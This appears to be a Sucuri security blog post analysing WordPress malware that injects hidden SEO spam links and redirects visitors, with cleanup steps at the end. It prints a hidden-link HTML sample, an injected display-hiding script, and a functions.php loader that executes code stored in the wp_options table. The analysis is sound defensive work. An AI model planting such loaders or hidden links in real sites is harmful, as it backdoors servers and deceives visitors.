@@ -1,0 +1,59 @@
+Clever SEO Spam Injection
+
+It’s very common for us here at Sucuri to face SEO injections on almost any type of CMS-based site. Today, I’ll be presenting how one particularly ingenious malware manages to hide so well inside a WordPress website.
+The Traditional Approach
+There are two common approaches attackers use to inject SEO spam on websites:
+
+Injecting HTML code for concealed elements in theme files
+Injecting fake spam posts in the WordPress database
+
+Both approaches are readily found during Sucuri’s routine remediation process.
+For the first approach, infections are usually found via a simple file search for the terms attackers inject on the page. Did you find SEO spam for luxury handbags on your site? Search your files for that term and bang, there it is.
+The code usually resembles something like this:
+<p><a style="display: none; position: absolute; left: -9845px;" href="www.example.com/buy-cheap-luxury-handbags">Buy Cheap Luxury Handbags</a></p>
+As for the second approach, locating the infection is even more straightforward. Although we use specialized database scanning tools, you can usually find the injected post by logging into your WordPress dashboard and searching for posts containing those terms.
+
+With both of these approaches, removal is quick and easy: Remove the injected content and submit the site for blacklist review / SEO reindexing.
+In some unusual cases, it can be more challenging, however. This is where the ingenious malware sample comes in.
+The Smart Complex Approach
+We found the following sample in two unrelated websites over a two-week timeframe. Both sites showed the same behavior–SEO spam with conditional redirects to sketchy looking external domains. Searching the theme files for injected HTML content or the database for SPAM posts yielded nothing relevant.
+In this particular case,  the site’s source code appended the SEO spam right after the closing HTML tag:
+<div id="a55d837"><ul><li><a href="hxxp://<redacted>.ca/crack-for-sortsite-professional-4-6" title="" ></a></li> </ul><div><script type="text/javascript"> document.getElementById("a55d837").style.display="none"; </script>
+At the time of this writing, there are already 173 hacked sites based on this PublicWWW search.
+Here is how we detect this spam in our SiteCheck scanner.
+
+After some extensive searches, we noticed a suspicious code block on the theme’s functions.php file loading content from the WordPress’s wp_options table:
+$wp_template_css = get_option('themes_css' );
+
+if ( isset( $wp_template_css['style'] ) )
+
+@$wp_template_css['style']( null, $wp_template_css['fonts']($wp_template_css['html']) );
+The code itself looks suspicious, as it silently executes part of the content fetched from the database. On top of that, it loads a “theme_css” option, which is not how CSS is usually loaded on a typical WordPress theme. Searching the database for that option, we found the malware itself.
+How it Works
+This malware sample has two distinct purposes:
+
+Add hidden links for indexing by search engines.
+Intercept particular requests to the site and redirect site visitors to spam content.
+
+What’s clever about this particular piece of malware is how it stores the spam content on the site and how it operates to inject the content into the original response sent by WordPress:
+It creates fake backup tables on the site’s database to store spam posts (backupdb_prefix_posts) and information about logged in visitors (backupdb_prefix_lstat). These tables use a different prefix (backupdb_prefix_) than the original WordPress tables. As a result, posts won’t load or show up on a site’s admin dashboard.
+Hijacked Database Connections
+In order to actually load the content, the malware adds filters for WordPress’ “the_content“, “wp_header” and “wp_footer” handlers that hijacks the WordPress database connection while the site is still processing its response. It then directs that connection to these fake tables, where it fetches links to the “alternative” spammy posts and appends them to the legitimate content before sending it back to the visitor’s browser.
+The attacker was smart enough to return the database connection to the default tables before handing back the control so WordPress’ default flow can proceed “normally”. The injected links are invisible to human visitors, but search engines crawl and index them and they become search results.
+Clicking on these injected links redirects visitors to third-party sites. This occurs because of the special JavaScript links injected into the spammy posts which allow hackers to inject additional content into the posts on the fly (e.g. redirect scripts). Attackers achieve this with the following part of the same malicious code from functions.php and wp_options table.
+
+In this case, a request to the hacker-controlled my-game[.]biz site is made to fetch additional customized code based on the visitors IP address, referrer and browser’s User-Agent string.
+Only non-registered site users are targeted to help conceal malicious activity. The backupdb_prefix_lstat table tracks IPs, which reduces the chance of detection by the site owner/administrator.
+Localization Targeting
+An interesting feature of this campaign is that it targets both English and Korean searchers who are looking for various “free” downloads.
+Typical spammy post in Korean
+Hacked sites affected by this kind of black hat SEO campaign can get links from around a thousand sites overnight. We can see this on this chart from the Majestic Site Explorer below – a little under 1,000 domains during August, then almost 1,500 domains by the beginning of October.
+
+Mitigation
+Sites that have been infected with this particular SEO spam can refer to the following steps to clean it up:
+
+Find and remove the malicious code from the theme’s functions.php.
+Find and remove the option mentioned in the malicious code (e.g. themes_css but the actual name may vary.)
+Check your WordPress database for tables with unknown prefixes. E.g. backupdb_wp_ instead of wp_. Specifically look for backupdb_wp_posts and backupdb_wp_lstat tables. The actual name may be different if you use table prefix other than wp_.
+
+After that, follow the mitigation steps found in our guide on cleaning hacked WordPress sites. If you need a hand removing SEO spam from a compromised website, we’re always happy to help.
